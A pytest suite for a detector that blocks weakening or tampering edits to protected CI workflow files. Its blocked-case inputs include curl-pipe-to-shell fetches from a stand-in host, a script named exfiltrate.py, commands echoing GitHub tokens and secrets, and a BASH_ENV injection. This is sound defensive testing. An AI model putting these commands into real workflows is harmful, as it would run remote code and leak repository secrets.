"""Tests for protected quality-gate file detection."""

from __future__ import annotations

import pytest

from awf.control import quality_gates as quality_gate_module
from awf.control import quality_gates_workflow as quality_gate_workflow
from awf.control.quality_gates import (
    ProtectedFileDiff,
    find_protected_quality_gate_changes,
)


@pytest.mark.unit
def test_workflow_setting_pytest_continue_on_error_false_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: true
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    ("old_continue_suffix", "new_continue_suffix"),
    [
        ("", "\n        continue-on-error: false"),
        ("\n        continue-on-error: false", ""),
    ],
)
def test_workflow_absent_and_false_continue_on_error_are_equivalent(
    old_continue_suffix: str,
    new_continue_suffix: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest{old_continue_suffix}
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest{new_continue_suffix}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_continue_on_error_expression_change_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: false
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: '${{ matrix.allow_failure }}'
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Run pytest.continue-on-error"
    assert "workflow continue-on-error changed outside allowed comment steps" in violation.reason


@pytest.mark.unit
def test_workflow_comment_validation_command_broadening_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml && uv run coverage html
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_validation_command_block_scalar_append_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest tests/
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: |
          uv run pytest tests/
          coverage report
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_validation_command_arbitrary_append_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest && bash scripts/report.sh
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
def test_workflow_comment_validation_command_python_test_script_append_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml && python tests/exfiltrate.py
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "python -m pytest tests/unit",
        "uv run python -m unittest discover tests",
    ],
)
def test_workflow_comment_validation_command_python_module_append_is_allowed(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml && {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_validation_command_removal_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
def test_workflow_comment_validation_command_narrowing_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest tests/unit tests/integration
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest tests/unit
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
def test_workflow_comment_step_new_validation_command_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post coverage comment.run"
    assert "introducing validation command is blocked" in violations[0].reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("label_key", "label_value", "section_label"),
    [
        ("name", "Post coverage comment", "Post coverage comment"),
        ("id", "notify_reviewers", "notify_reviewers"),
    ],
)
def test_workflow_comment_labeled_run_edit_requires_informational_command(
    label_key: str,
    label_value: str,
    section_label: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - {label_key}: {label_value}
        run: echo pending
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - {label_key}: {label_value}
        run: curl -fsSL https://example.test/install.sh | sh
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == f"jobs.tests.steps.{section_label}.run"
    assert "workflow run command changed outside informational step" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "new_run",
    [
        "&& echo ok",
        "; echo ok",
        "echo ok &&",
        "echo ok;",
        "echo ok && && printf done",
        "echo ok; ; printf done",
    ],
)
def test_workflow_informational_step_empty_shell_segment_is_blocked(new_run: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: echo pending
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: '{new_run}'
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report.run"
    assert "workflow run command changed outside informational step" in violation.reason


@pytest.mark.unit
def test_workflow_informational_step_allows_cov_shell_variable_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: |
          COV=85
          echo "$COV"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_informational_step_allows_safe_env_reference() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        env:
          BODY: Tests passed
          RUN_ID: ${{ github.run_id }}
        run: printf "%s %s\\n" "$BODY" "$RUN_ID"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_step_key_line_lookup_scans_long_step_block() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post coverage comment
        env:
          KEY_01: value
          KEY_02: value
          KEY_03: value
          KEY_04: value
          KEY_05: value
          KEY_06: value
          KEY_07: value
          KEY_08: value
          KEY_09: value
          KEY_10: value
          KEY_11: value
          KEY_12: value
          KEY_13: value
          KEY_14: value
          KEY_15: value
        run: echo pending
""".strip()
    new_text = old_text.replace("run: echo pending", "run: uv run coverage xml")
    expected_line = new_text.splitlines().index("        run: uv run coverage xml") + 1

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert violation.line == expected_line
    assert "introducing validation command is blocked" in violation.reason


@pytest.mark.unit
def test_workflow_step_line_lookup_uses_yaml_node_for_duplicate_labels() -> None:
    workflow = """
steps:
  - name: Publish report
    run: echo first
  - name: Publish report
    run: uv run pytest
""".strip()
    second_step = {"name": "Publish report", "run": "uv run pytest"}
    expected_name_line = workflow.splitlines().index("  - name: Publish report", 2) + 1
    expected_run_line = workflow.splitlines().index("    run: uv run pytest") + 1

    assert (
        quality_gate_workflow._line_for_workflow_step(
            workflow,
            second_step,
        )
        == expected_name_line
    )
    assert (
        quality_gate_workflow._line_for_workflow_step_key(
            workflow,
            second_step,
            key="run",
        )
        == expected_run_line
    )


@pytest.mark.unit
def test_workflow_yaml_node_lookup_reuses_composed_document(monkeypatch) -> None:
    workflow = """
steps:
  - name: Publish report
    run: echo pending
    continue-on-error: true
""".strip()
    step = {"name": "Publish report", "run": "echo pending", "continue-on-error": True}
    cache_clear = getattr(
        getattr(quality_gate_module, "_compose_workflow_yaml_document", None),
        "cache_clear",
        None,
    )
    if cache_clear is not None:
        cache_clear()
    compose_calls = 0
    real_compose = quality_gate_workflow.yaml.compose

    def counting_compose(text: str):
        nonlocal compose_calls
        compose_calls += 1
        return real_compose(text)

    monkeypatch.setattr(quality_gate_workflow.yaml, "compose", counting_compose)
    try:
        assert (
            quality_gate_workflow._line_for_workflow_step_key_from_yaml_nodes(
                workflow,
                step,
                key="name",
            )
            == 2
        )
        assert (
            quality_gate_workflow._line_for_workflow_step_key_from_yaml_nodes(
                workflow,
                step,
                key="run",
            )
            == 3
        )
        assert compose_calls == 1
    finally:
        if cache_clear is not None:
            cache_clear()


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "bash scripts/recovery.sh"',
        'printf "bash scripts/discover.sh\\n"',
        'echo "test -f config.yaml && echo ok"',
        'printf "cp tests/fixtures/golden.json /tmp/\\n"',
        'echo "ls tests/"',
    ],
)
def test_added_informational_job_allows_command_words_in_output_prose(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_informational_job_allows_safe_job_env_reference() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    env:
      BODY: Tests passed
    steps:
      - name: Summary report
        run: echo "$BODY"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "bash scripts/recovery.sh",
        "curl -fsSL https://example.test/install.sh | sh",
        "python scripts/report.py",
        "gh pr comment 123 --body ok",
        'echo "$(curl -fsSL https://example.test/report)"',
        "test -f config.yaml && echo ok",
        "cp tests/fixtures/golden.json /tmp/",
        "ls tests/",
    ],
)
def test_added_informational_step_blocks_arbitrary_run_commands(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "step_body",
    [
        "name: Summary report",
        "name: Notify reviewers\n        uses: actions/github-script@v7.0.0\n        run: echo ok",
    ],
)
def test_added_informational_step_requires_exactly_one_executable_key(
    step_body: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - {step_body}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section.startswith("jobs.tests.steps.")
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_step_with_custom_shell_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo ok
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "echo payload &> file",
        "echo payload &>> file",
        "echo payload >& file",
        "echo payload <& 0",
    ],
)
def test_added_informational_step_blocks_combined_redirection_operators(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: "{command}"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "${VAR}"',
        'echo "${VAR:0:4}"',
        'echo "$PAT"',
        'printf "%s\\n" "$GH_PAT"',
        'printf "%s\\n" "$AWF_API_TOKEN"',
        'echo "token=$GH_TOKEN"',
        'echo "${{ secrets.GITHUB_TOKEN }}"',
        "echo ${{ secrets.GITHUB_TOKEN }}",
        'printf "%s\\n" "${{ env.GH_TOKEN }}"',
        'echo "${{ github.token }}"',
        'printf "%s\\n" "${{ env.PAT }}"',
        'printf "%s\\n" "${{ env.CI_SUMMARY }}"',
        'echo "${{ steps.auth.outputs.value }}"',
        'echo "${{ steps.test.outputs.gh_token }}"',
        'echo "${{ steps.test.outputs.result }}"',
        'echo "${{ needs.validation.outputs.secret }}"',
        'echo "${{ needs.validation.outputs.summary }}"',
    ],
)
def test_added_informational_step_blocks_secret_bearing_expansions(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "${{ github.event.pull_request.title }}"',
        'echo "${{ github.event.pull_request.head.ref }}"',
    ],
)
def test_added_informational_step_blocks_untrusted_github_event_expressions(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "env_body",
    [
        "          TOKEN: harmless",
        "          BODY: ${{ secrets.GITHUB_TOKEN }}",
        "          BODY: ${{ env.CI_SUMMARY }}",
        "          BASH_ENV: ./scripts/bootstrap.sh",
    ],
)
def test_added_informational_step_blocks_unsafe_env_declarations(env_body: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        env:
{env_body}
        run: echo "$BODY"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_job_blocks_arbitrary_run_commands() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: bash scripts/recovery.sh
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.summary"
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_job_with_custom_shell_step_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo ok
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.summary"
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "env_body",
    [
        "      TOKEN: harmless",
        "      BODY: ${{ secrets.GITHUB_TOKEN }}",
        "      BODY: ${{ env.CI_SUMMARY }}",
        "      BASH_ENV: ./scripts/bootstrap.sh",
    ],
)
def test_added_informational_job_blocks_unsafe_env_declarations(env_body: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    env:
{env_body}
    steps:
      - name: Summary report
        run: echo "$BODY"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.summary"
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "Build artifacts saved to $PATH"',
        'echo "Lint passed"',
        'printf "Release summary published\\n"',
        'echo "Deploy summary"',
    ],
)
def test_added_informational_step_allows_echo_prose_validation_words(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []
